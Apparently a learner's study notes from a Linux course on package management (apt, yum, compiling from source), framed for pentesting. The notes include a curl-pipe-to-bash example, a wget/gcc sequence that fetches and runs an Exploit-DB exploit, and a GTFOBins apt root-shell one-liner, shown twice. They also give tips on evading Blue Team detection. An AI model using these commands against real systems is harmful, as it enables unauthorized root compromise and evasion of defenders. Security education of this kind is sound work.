# 📦 05 - Installing Software: Package Management

## Status: 🟢 Completed

---

> ### 🧠 A Quick Note Before We Start
> Unlike the previous lessons — permissions, SUID, sudo — which formed the *entire foundation* of privilege escalation and deserved deep excavation, this module is mostly **practical, hands-on knowledge**. It doesn't carry the same density of deep security angles, and stretching it artificially would just be perfectionism for its own sake. So here it is: tight, complete, and exactly as deep as it needs to be.

---

## 🕳️ The Problem That Existed Before Package Managers
Before package managers existed, if you wanted to install a program on Linux, you had to hunt down source files across the internet manually, and every single file would tell you *"I'm missing another dependency."* You'd fall into an endless spiral known as **Dependency Hell** — building everything by hand, which could take hours for a single program.

The package manager essentially built an **"App Store" for the terminal** — one command, and you're done.

### 📍 Where does this show up in your daily work?
Every time you open Kali and need a tool that isn't already installed — `seclists`, `gobuster`, even a random Python library — the first thing you do is `apt install`. This isn't optional. It's daily bread and butter.

---

## 🍽️ Part 1: `apt` — The Commands You'll Use Every Single Day

~~~bash
sudo apt update
~~~
What it does: Refreshes your local "catalog" of all available programs and their versions from remote servers (repositories).
⚠️ Important: This does NOT update any actual installed software. It only refreshes the list.

~~~bash
sudo apt upgrade
~~~
Actually updates every installed program that has a newer version available, based on the freshly-refreshed list.

~~~bash
apt search keyword              # search for a tool
apt show packagename            # view details about a package
sudo apt install packagename    # install a package
sudo apt remove packagename     # remove a package
sudo apt purge packagename      # completely wipe a package
sudo apt autoremove             # clean up unused dependencies
~~~

### 🔍 remove vs. purge

| Command | Behavior |
|---|---|
| remove | Deletes the program but keeps its configuration files (useful if you plan to reinstall later and want to preserve settings). |
| purge | Deletes absolutely everything, no traces left behind. |

---

## 🔄 Part 2: yum/dnf — Same Concept, Different Distro Family
As covered previously, if you land on an RHEL-based machine (CentOS, Fedora), `apt` simply won't exist there. Here are the equivalent commands — same philosophy, different dialect:

~~~bash
sudo yum check-update    # equivalent to apt update
sudo yum update          # equivalent to apt upgrade
yum search packagename
sudo yum install packagename
sudo yum remove packagename
~~~

### 🎯 The One Practical Lesson Worth Remembering
If you land a shell on a target and `apt install nmap` returns "command not found" — don't waste time. Immediately try `yum install nmap` or `dnf install nmap`. This is exactly the principle we covered back in the distros lesson.

---

## 🔐 Part 3: Trust, Signatures, and the Dangers of Blind Installation

### 🤔 Why does trust even matter here?
When you run `apt install`, the system is trusting that the repository (the server you're downloading from) is legitimate, and that the package hasn't been tampered with in transit. The real protection here isn't "manual inspection" — it's GPG signatures. Every package carries a digital signature, and the system verifies that signature before installing anything.

### 🧨 The Real Security Angle
If you add a random, unofficial repository (via something like `add-apt-repository`) without verifying its source, you've practically opened the door for anyone to inject malware disguised as a "routine update." This principle is called a **Supply Chain Attack** — the same category of attack behind real-world incidents like SolarWinds.
We won't dive deep into this now, but keep the practical rule in mind: never add repositories from unknown sources, especially on machines holding sensitive data.

### ⚠️ curl | bash — A Dangerous Habit You'll See Everywhere
You'll frequently find GitHub tools telling you to install them like this:

~~~bash
curl -sSL https://example.com/install.sh | bash
~~~

Why is this dangerous? You're executing code directly from the internet without ever looking at it. If the server gets compromised, or the link gets swapped, you could be running literally anything.

### ✅ Best Practice
~~~bash
curl -sSL https://example.com/install.sh -o install.sh
cat install.sh    # open it and read it first
bash install.sh   # only run it once you've confirmed it's clean
~~~

---

## 🛠️ Part 4: Compiling From Source — The Most Important Part of This Lesson for Your Goals
The classic pipeline: `wget` → `tar` → `configure` → `make` → `make install`

### 🎯 Why is this the most important section here?
Many privilege escalation exploits you'll find on sites like Exploit-DB aren't ready-made programs — they're raw C source code. You'll find yourself going through almost this exact same pipeline, except instead of preparing regular software, you're weaponizing an exploit.

~~~bash
# You found a specific kernel version on the target, and a matching exploit on Exploit-DB
wget https://exploit-db.com/download/12345 -O exploit.c
gcc exploit.c -o exploit      # small exploits get compiled directly with gcc instead of configure/make
./exploit
~~~

### 🧾 The Commands You Actually Need From This Lesson

~~~bash
wget URL                # download a file without a browser
tar -xzf file.tar.gz    # extract an archive (as covered previously)
./configure             # only relevant for larger projects (rare in small exploits)
make                    # build the code
sudo make install       # install into system paths
~~~

### 🔑 Key Insight
`apt update` refreshes the list, `apt upgrade` actually updates the software — they're two distinct operations and you need both. And if a tool isn't available as a ready-made package, `wget` + `tar` + `gcc/make` is the exact same skillset you'll use to weaponize any exploit from Exploit-DB. This isn't a separate topic from pentesting — it is one of your core pentesting tools.

---

## 🎬 Real-World Scenario: Privilege Escalation via apt
1. You compromised a web server and landed as a low-privilege user: `www-data`.
2. You run `sudo -l` (from the previous lesson) to check what you're allowed to do.
3. You discover the admin left you permission to run `apt` as root, without a password (a common mistake, usually done so the server can auto-update itself).
4. As a hacker, you're not going to run a boring update. You head straight to GTFOBins (the hacker's holy book), and find this:

~~~bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
~~~

This command tricks `apt` into thinking: "Before you run the update, open me a shell first." And since `apt` is running as root... the shell that opens is a **root shell**.
Congratulations — you just fully compromised the server using nothing more than the ordinary software installer.

---

## 🧾 Section Summary — Round One

| Command | Purpose |
|---|---|
| `apt update` | Refreshes the "menu" (the package list). |
| `apt upgrade` | Actually installs the available updates (don't run this carelessly on other people's servers). |
| `apt search [name]` | Searches for a tool. |
| `apt install [name]` | Installs the tool. |

### ⛪ The Holy Trinity of Compiling Exploits
* `./configure` → Inspect the kitchen.
* `make` → Cook the meal.
* `make install` → Serve it.

---

## 🎓 Bonus Deep Dive: In Case the Picture Still Isn't 100% Clear

### 🧩 What Problem Does This Actually Solve?
Back in the day, installing a program on Linux meant scouring the internet for source files, and every file would complain: "I'm missing another file." This vicious cycle is called Dependency Hell.
To fix this, Package Managers were created — `apt` for Debian/Kali systems, `yum` for RedHat/CentOS systems. Think of them exactly like the App Store or Google Play: you say "install this," and it goes and fetches the program and everything it needs, automatically.

### 📍 Where Does This Show Up in a Pentester's Real Life?

| Phase | How Package Management Shows Up |
|---|---|
| 🔍 Recon | When you land on a compromised server, the first thing you check is what software is installed (you might find an outdated, vulnerable version to exploit). |
| ⚔️ Weaponization | Sometimes you compromise a "bare-bones" server with zero hacking tools installed — you're forced to install your own arsenal manually. |
| 🚀 Privilege Escalation | The most important one. Sometimes a careless admin grants you permission to run apt as root. Hackers exploit this to pop a full root shell. |

### 🍽️ The Restaurant Analogy: update vs. upgrade
Imagine you're sitting in a restaurant.
* `apt update` means: "Waiter, bring me the new menu so I can see what's available and whether prices changed." You're just refreshing the list here.
* `apt upgrade` means: "Waiter, now actually bring the new food to my table." This is the part that actually takes time and space.

### 🥷 What The Lecturer Didn't Tell You: The Hacker's Wisdom
As Red Teamers, we generally hate running `apt install` on a victim's machine. Why? Because the Blue Team has alerts in place. If they suddenly see a web server installing a hacking tool like `nmap` out of nowhere, they'll immediately know something's wrong — and kick us out.
Instead, we rely on a principle called **Living off the Land (LotL)** — using tools that are already present on the system (like `python` or `bash`) to carry out our attack, without installing anything that raises suspicion.

### 🤔 The Philosophical Question: Why Does This Matter So Much in Hacking?
The most notorious privilege escalation vulnerabilities (like the infamous Dirty COW) are written in C. The hacker downloads the raw source code onto the victim's server and must compile it (turn source code into a working executable) directly on that same server, so it runs correctly without breaking.

### 🎂 The Compiling Process, Explained Like You're Five
Imagine you brought a batch of raw cake batter (Source Code).

| Step | Kitchen Analogy | What Actually Happens |
|---|---|---|
| `./configure` | Inspects the kitchen, checks you have a stove, trays, and sugar. | Verifies the environment is ready. |
| `make` | Puts the batter in the oven and bakes the cake. | Converts the source code into a working program. |
| `make install` (needs sudo) | Places the finished cake on display for everyone to enjoy. | Moves the compiled program into official system directories. |

### 🎬 Real-World Scenario (Red Team — Privilege Escalation)
1. You compromised a web server and became the weak user `www-data`.
2. You run `sudo -l` (from the previous lesson) to see what you're permitted to do.
3. You find the admin left you permission to run `apt` as root without a password (a very common mistake, usually done to let the server auto-update itself).
4. As a hacker, you're not going to run a boring update. You head straight to GTFOBins (the hacker's scripture), and find that typing:

~~~bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
~~~

tricks `apt` into thinking: "Before running the update, open me a command shell." And since `apt` is running as root, the shell that opens is a **Root Shell**!
Congratulations — you just fully compromised the server using nothing more than the completely ordinary software installer tool.

---

## 🧾 Final Summary

| Command | Meaning |
|---|---|
| `apt update` | Refreshes the menu (the list). |
| `apt upgrade` | Downloads the actual updates (avoid doing this carelessly on someone else's server — it could break things). |
| `apt search [name]` | Searches for a tool. |
| `apt install [name]` | Installs the tool. |

### ⛪ The Holy Trinity of Exploits
* `./configure` → Inspecting the kitchen.
* `make` → Cooking.
* `make install` → Serving.

### 🔑 The One-Line Takeaway
`apt` is your delivery service — it fetches your tools straight to your doorstep, but use it carefully, because it leaves receipts (logs) that can expose you to the Blue Team. And when you find a raw exploit written in C, throw it in the oven with `make` and pull out a weapon.

---
*This content was studied and written in my own words based on the concepts covered in TCM Security's Linux 101 course. Any errors in explanation or terminology are entirely my own.*
